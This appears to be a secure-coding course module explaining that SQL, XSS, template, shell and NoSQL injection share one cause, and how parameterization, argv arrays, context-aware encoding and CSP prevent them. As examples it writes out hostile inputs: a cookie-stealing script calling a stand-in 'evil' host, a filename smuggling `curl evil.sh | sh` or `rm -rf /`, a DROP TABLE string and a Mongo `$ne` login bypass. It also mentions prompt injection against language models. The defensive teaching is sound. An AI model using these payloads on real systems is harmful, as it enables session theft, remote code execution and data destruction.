# The Shape of Every Injection

_Module 20.2 — Security Best Practices_

## The Problem

Start with the bug everyone already knows, because the point of this article is what it has in common with five bugs that look nothing like it.

A support tool lets staff look up a customer by name. The query is built the obvious way:

```sql
"SELECT * FROM customers WHERE name = '" + input + "'"
```

Someone types `x' OR '1'='1` and gets every customer. Someone types `x'; DROP TABLE customers; --` and it's worse. This is SQL injection, it is thirty years old, and the fix — bound parameters — has been covered three times already in this map (Modules 5, 6, and 7). If that were all injection is, this article wouldn't exist.

Now four bugs that a team who "fixed SQL injection" still ships:

**The reflected script.** A search page echoes the query back: `You searched for: <the input>`. Someone searches for `<script>fetch('//evil/'+document.cookie)</script>`. Every user who clicks a crafted link runs the attacker's JavaScript with the victim's session. No database was touched. The input was parameterized perfectly on its way *in*; the damage happened on the way *out*.

**The template.** A "customize your email footer" feature renders user text through the same template engine the app uses for its own pages. Someone writes `{{7*7}}` and sees `49`. Then they write the expression that reaches the runtime and reads environment variables. Server-side template injection — remote code execution from a text box that was only ever meant to hold a signature.

**The shell.** An image thumbnailer builds a command: `convert " + filename + " -resize 100x100`. Someone uploads a file named `x.jpg; curl evil.sh | sh`. The database is untouched, the HTML is fine, and the server is now running the attacker's script.

**The lookup.** A login form checks credentials against an LDAP directory, or a filter against a Mongo query built from a request body: `{ user: req.body.user, pass: req.body.pass }`. Someone sends `{ "pass": { "$ne": null } }` and authenticates as anyone. No SQL, no quotes, no escaping that a SQL-shaped mind would even think to apply.

Four different interpreters, four different syntaxes, one identical bug. And the team that "handles injection" by remembering to parameterize SQL is exposed to all four, because they learned a fix for one interpreter instead of the shape the fix is an instance of.

```
   the mistake                          what's actually true
   ────────────────────────             ──────────────────────────────
   "injection" = "SQL injection"        SQL is one interpreter of many
   fix = "escape/sanitize the input"    fix = keep data OUT of the code grammar
   one defense, applied at input        a different defense per interpreter,
                                          applied where data MEETS that interpreter
```

## What It Is

**Injection** is what happens when data crosses into an interpreter that parses it — and the interpreter cannot tell the parts you meant as *structure* from the parts that arrived as *data*. The attacker supplies data that the interpreter reads as structure, and now they are writing the program.

Every injection has the same three ingredients:

1. **An interpreter** — something that takes a string and parses it into actions: a SQL engine, an HTML parser, a shell, a template engine, an LDAP server, an XML parser, a regex compiler, an `eval`.
2. **A sentence built by mixing** trusted structure (your query, your page, your command) with untrusted data (what the user sent).
3. **No boundary in the sentence** between the two — so a piece of data that contains the interpreter's control characters (`'`, `<`, `;`, `{{`, `$`) escapes its intended slot and becomes control.

Said in one line: **injection is a confusion of data and code, caused by handing an interpreter a single string in which the two were never separated.**

This is the definition that makes the four bugs above one bug. It also tells you immediately where the real fix has to live — not "clean the input," but "stop building the sentence by concatenation."

The neighbour to disambiguate, because Module 7 explicitly handed it here: **input validation is not the fix for injection, and output encoding is not input sanitization.** Validation (Module 7.3) rejects malformed input at the boundary — it's worth doing, and it is not a security control against injection, because plenty of valid data is also a valid attack (`O'Brien` is a real surname and a broken SQL query). The fix is applied where data *meets the interpreter*, which for a query is on the way in and for a web page is on the way out — often long after validation is done.

## Recognizing the Problem

You have an injection risk wherever untrusted data reaches an interpreter through string assembly. The scannable signals:

- A query, command, path, URL, or markup string is built with `+`, string interpolation, template literals, or `sprintf`, and any part of it came from a request, a database row, or a file.
- You find yourself writing an escaping function — `escapeQuotes`, `stripTags`, `sanitize` — to make user input "safe" before concatenating it. Writing the escaper is the smell; the escaper is you doing, by hand and fallibly, the job the interpreter's own parameter mechanism does correctly.
- User-controlled text appears in a page, an email, a PDF, a log line, or a CSV without an encoding step named at the point it's inserted.
- A template engine renders a string that a user can influence (a name in `{{ }}`, a subject line, a "custom message").
- Anything shells out — `exec`, `system`, `Runtime.exec`, `child_process` — with an argument that isn't a hard-coded constant.
- A NoSQL query, an LDAP filter, an XPath, or a GraphQL argument is built from a request object rather than from typed fields you pulled out one at a time.
- The word "sanitize" appears in your codebase as the security story. (Sanitizing is a real technique in exactly one place — rich-text HTML — and a warning sign everywhere else.)
- Data flows in one place and out in three, and only the "in" place was ever considered.

## How It Works

### The one real fix: structural separation

The durable defense is the same idea in every interpreter, even though its name changes: **send the structure and the data to the interpreter as separate things, so the interpreter never has to guess where one ends and the other begins.**

For SQL, that's the bound parameter:

```
  concatenation:  the query and the data arrive as ONE string
                  "...WHERE name = 'x' OR '1'='1'"   ← parser sees OR as logic

  parameterized:  the query and the data arrive SEPARATELY
                  "...WHERE name = ?"   +   ["x' OR '1'='1"]
                  the ? is a slot; the value is only ever a value, never parsed
```

The prepared statement is not "escaping done well." It's escaping made *unnecessary*, because the value never enters the grammar. The database receives the query's structure, compiles it, and *then* binds the value into a slot that is defined to be data. There is no string in which `'` could mean anything.

Every interpreter has its version of this, and the whole of injection defense is knowing which one to reach for:

```
  interpreter        the structural-separation fix
  ─────────────      ───────────────────────────────────────────────
  SQL                bound parameters / prepared statements
  shell              pass an argv array, no shell: execFile(cmd, [args])
  HTML               don't build markup from strings; set textContent,
                       or encode per context (next section)
  templates          never compile user input as a template; pass it as
                       a variable INTO a fixed template
  NoSQL / Mongo      pull typed fields explicitly; never spread req.body
                       into a query object
  LDAP / XPath       the library's parameter-binding / filter-builder API
  OS paths           resolve and confirm the result stays under a base dir
  CSV                prefix formula-triggering leading chars (= + - @)
```

Notice what unifies the right column: none of them are "clean the bad characters out." They all **remove the ambiguity** so there are no bad characters — the interpreter is told, structurally, which bytes are data.

### Why "sanitize the input" is the wrong mental model

Input sanitization — stripping or escaping dangerous characters as data arrives — fails for three structural reasons, and they're worth internalizing because sanitization is the intuitive answer and it is close to always wrong:

- **The dangerous character depends on the interpreter, which you don't know at input time.** `<` is dangerous in HTML, harmless in SQL. `'` is dangerous in SQL, fine in HTML. A quote is data in JSON and a delimiter in a shell. You can't neutralize input for an interpreter you haven't reached yet — and the same stored string often reaches several.
- **The same data goes to multiple interpreters.** A username entered once is later put into HTML, an email, a log line, a SQL query, and a filename. Each wants a different treatment. Sanitizing at input picks one interpreter's rules and corrupts the value for all the others — while protecting none reliably.
- **Legitimate data contains the characters.** `O'Brien`, `<3`, `Ben & Jerry's`, `1+1=2`. Strip them and you've broken real data to defend against an attack that structural separation would have handled without touching the value.

The rule that falls out: **validate/reject at input for correctness; encode or parameterize at the interpreter for safety.** These are different steps, in different places, for different reasons. Merging them into one "sanitize" step at the door is the mistake.

### The one that's different: output encoding for the web

SQL injection is fixed on the way *in*. XSS is the mirror image — it's fixed on the way *out*, and it's the injection most teams get wrong because the interpreter (the user's browser) is downstream of everything and the "sentence" is your HTML page.

The mechanism is identical: untrusted data is placed into a page, the browser's HTML/JS parser reads the attacker's `<` and `"` as structure, and now their script runs. The fix is also structural separation, but because you're building a document the interpreter reads later, it takes the form of **encoding the data for the exact context it lands in.**

And "context" is the whole subtlety, because HTML is not one interpreter — it's several nested ones, and the correct encoding differs for each:

```
  where the data lands                    what must be encoded / the rule
  ────────────────────────────────        ────────────────────────────────────
  <div>HERE</div>            (HTML body)  < > & → entities
  <input value="HERE">       (attribute)  " ' and the above; always quote attrs
  <script>var x="HERE"</script> (JS)      JS-string escaping — different rules
  <a href="HERE">            (URL)        URL-encode; and BLOCK javascript: schemes
  <style>... HERE ...</style> (CSS)       CSS escaping — different again
  onclick="HERE"             (JS-in-attr) two interpreters nested; avoid entirely
```

The classic failure is applying HTML-body encoding (which turns `<` into `&lt;`) to a value that lands in a JavaScript string, where `<` was never the problem — the attacker breaks out with a `"` and a `</script>`, neither of which HTML-entity encoding touches. **Right encoding, wrong context, still exploited.** This is why "we escape HTML" is not an answer to XSS; the question is always *which context*, and a value that flows into two contexts needs two encodings.

The reason this mostly works today without anyone thinking about it: modern frontend frameworks (React, Vue, Angular, Svelte) encode by default. `<div>{userName}</div>` in React is safe because JSX HTML-encodes interpolated values automatically. The framework made the safe path the default one — the same story as parameterized queries becoming the default is why Injection fell from #3 to #5 on the 2025 OWASP list. Which means, in a framework codebase, XSS lives almost entirely in the few places you leave the default: `dangerouslySetInnerHTML`, `v-html`, `href={userUrl}`, injecting into a non-React DOM node, or building an HTML email by hand.

### The layered defense that catches what you missed

Encoding is the fix; two more layers reduce the blast radius of an encoding you got wrong:

- **Content-Security-Policy (CSP).** An HTTP response header that tells the browser which script sources to trust. A strict CSP (`script-src 'self'` with nonces, no `'unsafe-inline'`) means an injected `<script>` won't execute even if it reaches the page — the browser refuses inline script it wasn't told to expect. It doesn't fix the bug; it turns a working exploit into a blocked one, which is the difference between an incident and a log line. This is the "defense in depth" that Module 20.4 (security headers) builds out.
- **`HttpOnly` cookies.** The most valuable thing an XSS steals is the session cookie. `HttpOnly` (Module 4) makes the cookie unreadable from JavaScript, so a successful XSS can *act* as the user in their open tab but can't *exfiltrate* a token to use later from anywhere. A downgrade in blast radius, not a fix.

## When It's Appropriate

There is no "when" for the core defense — parameterize and encode always, from the first line. The interesting judgment is about the heavier controls:

- **Reach for a real HTML sanitizer library** (not a hand-rolled one) exactly when you must *render user-supplied HTML* — a rich-text comment, a WYSIWYG field, Markdown that allows some HTML. This is the one place "sanitize" is the right word, and even then you use DOMPurify or the equivalent, never your own allowlist, because the parser edge cases that defeat hand-rolled sanitizers are a genre of their own.
- **Reach for a strict CSP** when the app renders any user content and an XSS would be high-impact (it handles money, sessions, or admin actions). The rollout is incremental (report-only first) precisely because it's a real constraint on your own code.
- **Treat template injection as critical** the moment users can influence anything that reaches a template engine — subjects, footers, "personalized" messages, admin-configurable notifications. The fix is architectural (user text is a *value*, never a *template*), so it's cheap if designed in and expensive to retrofit.

## When It's Unnecessary or Overkill

- **Escaping data you're putting into a context where it isn't code.** HTML-encoding a value before storing it in the database corrupts the data and protects nothing — the database isn't an HTML parser. Encode at the point of use, for that use, not preemptively at rest.
- **Hand-writing an escaper for any interpreter that offers parameters.** If the library has bound parameters (all SQL drivers do), writing `escapeSqlString` is strictly worse: more code, more bugs, and it re-enables the attack the first time someone forgets to call it.
- **A CSP for a static marketing page with no user input and no session.** Nothing to steal, nothing injected; the header is cargo-culted. (Some headers are still cheap and worth it — 20.4 — but a strict script CSP has real cost.)
- **Sanitizing input "to be safe" on top of parameterizing.** Now `O'Brien` is mangled *and* the query was already safe. You paid in data corruption for redundancy you didn't need.
- **Stripping HTML from a field that is only ever rendered as plain text.** If it goes out through `textContent` or a framework's default-encoded interpolation, the encoding is already correct; pre-stripping just loses `<` from legitimate content.

## Trade-offs

- **Encoding is context-dependent, and context is easy to misjudge.** The single hardest thing about output encoding is that the *same value* needs different handling in different slots, and the person inserting it has to know which slot they're in. Frameworks hide this until you use an escape hatch — and the escape hatches are named things like `dangerouslySetInnerHTML`, which is the ecosystem trying to make the risk impossible to miss.
- **Parameterization doesn't cover dynamic structure.** Bound parameters bind *values*, not table names, column names, or `ORDER BY` directions. A sortable column chosen by the client cannot be a parameter — it must be an allowlist lookup (Module 7.3's `views` map is exactly this). The most common "we parameterized and were still injected" bug is a dynamic column or sort direction concatenated in because it couldn't be bound.
- **A strict CSP fights your own code first.** Inline scripts, inline styles, and third-party widgets all break under a good policy, so adopting one is a real migration with a report-only phase, not a header you flip on. The security is real; so is the cost.
- **Sanitizer libraries are a dependency with a threat model.** DOMPurify is excellent and also a thing that must be kept current, because new parser-confusion bypasses are found. Rendering user HTML is inherently a standing liability, not a solved problem.
- **Defense in depth can breed complacency.** "We have a CSP" is not "we don't need to encode." The layers are multiplicative only if each is actually maintained; a CSP with `'unsafe-inline'` bolted back on to make a widget work is a header that looks like protection and isn't.

## Alternatives

There isn't really an alternative to structural separation — it's the fix, and everything else is either a weaker version of it or a backstop for when it's missed:

- **Escaping instead of parameterizing.** The historical approach: transform dangerous characters so the interpreter reads them as literal. It works when done perfectly and fails on the first missed call, the first new interpreter quirk, the first multi-byte encoding trick. Reach for it only when an interpreter genuinely offers no parameter mechanism, and prefer a well-tested library escaper to your own.
- **Allowlist validation as the primary defense.** Constraining input to a known-safe set (a column name must be one of five; an ID must match `[0-9]+`) is the correct and only defense for the structural positions parameters can't bind. As a defense for *values*, it's a weaker backstop than parameterization, not a replacement — but for structure, it's all you have.
- **Sandboxed/logic-less templates.** Using a template engine that can't execute arbitrary expressions (or running templates in a sandbox) blunts template injection. Better: don't let users supply templates at all. The alternative to a safe template engine is an architecture where user text is never a template.
- **WAF signature blocking.** A web application firewall pattern-matching `' OR '1'='1` and `<script>`. It blocks the lazy attempts and none of the creative ones, corrupts legitimate input that resembles an attack, and gives a false sense of coverage (exactly the 20.1 checklist trap). A backstop that buys time for patching, never a fix.

## Implementation

TypeScript, and deliberately on the **output-encoding** side — the parameterization side was shown in Modules 5 and 6, and the encoding side is the part teams get wrong. The theme: make the safe path the default, and make the unsafe path loud.

The safe default, which needs no code because the framework is the code:

```tsx
// React HTML-encodes interpolated values. This is safe for any string,
// including <script>...</script> — it renders as visible text, not markup.
function Result({ query }: { query: string }) {
  return <p>You searched for: {query}</p>;   // no encoding call, safe by construction
}
```

The unsafe path, and what it actually takes to use it responsibly:

```tsx
import DOMPurify from "dompurify";

// Needed ONLY because this field is genuine rich text (a formatted comment).
// For plain text, the version above is correct and this is pure liability.
function Comment({ html }: { html: string }) {
  // Sanitize AT RENDER, configured to an explicit allowlist. Not at input:
  // the same stored comment might also go into an email or a plain-text digest,
  // each of which wants different handling.
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "ul", "ol", "li"],
    ALLOWED_ATTR: ["href"],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
  //          ^ the name is the ecosystem shouting. If you type this, a sanitizer
  //            must be on the previous line, every time, with no exception.
}
```

The URL context, which HTML encoding does not cover and which people miss:

```tsx
// An href is a URL context, not an HTML-body context. HTML-encoding the value
// does nothing about the real attack: href="javascript:stealCookies()".
function ProfileLink({ url }: { url: string }) {
  const safe = /^https?:\/\//i.test(url) ? url : "#";   // allowlist the scheme
  return <a href={safe}>profile</a>;
}
```

> The bug this closes is subtle because the value *looks* validated — it's a real string, it renders, it's even HTML-safe. But `javascript:`, `data:`, and `vbscript:` schemes turn a link into script execution, and no amount of HTML entity-encoding touches the scheme. The defense is an allowlist of protocols, checked at the point the URL becomes an `href`. This is the same "structure vs data" split: the scheme is structure (it decides what the browser *does*), so it can't be treated as free-form data.

And the shell case, because it's the one that turns a text box into RCE and the fix is a one-line habit:

```ts
import { execFile } from "node:child_process";

// WRONG: a shell parses this string. A filename of `x.jpg; rm -rf /` is two commands.
// exec(`convert ${filename} -resize 100x100 out.jpg`)

// RIGHT: no shell. Arguments are passed as a list; the OS treats each as one
// opaque argument, so `;` `|` `$()` in a filename are just characters in a name.
execFile("convert", [filename, "-resize", "100x100", "out.jpg"], (err) => { /* ... */ });
```

> The whole fix is `execFile` (argv array) over `exec` (a shell string). The array *is* the structural separation — argument boundaries are carried by the array, not by delimiter characters the attacker can forge inside a value. This is the shell's bound-parameter, and choosing it is the difference between "handles filenames" and "runs whatever the filename says."

Three snippets, three interpreters, one idea repeated: the value never gets to be structure.

## Further Reading

- **OWASP Cheat Sheet Series — Cross-Site Scripting Prevention, SQL Injection Prevention, and Injection Prevention.** The canonical per-context encoding rules. The XSS cheat sheet's context table is the reference the *How It Works* diagram compresses; read it in full once.
- **OWASP DOM-based XSS Prevention Cheat Sheet.** The client-side variant, where the sink is `innerHTML`/`eval`/`document.write` rather than a server-rendered page — increasingly the only kind of XSS a framework app has.
- **Content Security Policy Level 3 (W3C), and Google's `csp-evaluator` and strict-CSP guidance.** Why nonce-based `script-src` beats host allowlists, and how to roll a policy out in report-only mode first.
- **DOMPurify (github.com/cure53/DOMPurify).** The sanitizer to use when you must render HTML, and its documentation of the bypass classes that explain why you don't write your own.
- **PortSwigger Web Security Academy — the SQL injection, XSS, and server-side template injection tracks.** The best hands-on way to internalize that these are the same bug; the SSTI labs in particular make the template-as-code danger concrete.
- **OWASP Top 10:2025 A05 (Injection).** The category page, now including where prompt injection does and doesn't belong (it's the LLM Top 10's, Module 39.7 — a model reading its instructions from data is the exact same data-as-code confusion, one interpreter further out).
- Within this map: parameterization in **Modules 5, 6, and 7**; the allowlist-for-structure pattern in **7.3**; `HttpOnly` and session theft in **Module 4**; security headers and CSP in **20.4**; and the SSRF case (the server as the confused interpreter of a URL) in **17.1c**.

A **Java/Spring** sibling would earn its place on the encoding side specifically, because the story is different: server-side rendering with Thymeleaf auto-escapes in HTML context but not in JavaScript or URL contexts without the right `th:` attribute, so the "right encoding, wrong context" bug is a live default rather than an escape-hatch you have to reach for. Seeing where a server-templating framework draws the auto-escaping line — and where it silently stops — is the other half of the lesson the React default hides. Not yet written.

---

The habit to carry into every feature: **when a string you built is about to be read by something that parses it, find the boundary between your structure and their data — and if there isn't one, you have the bug, whatever the interpreter is called.** SQL, HTML, a shell, a template, an LDAP filter, a model reading a prompt: the name changes, the shape doesn't. The question is never "did I clean the input?" It's "did the value ever get the chance to be code?"
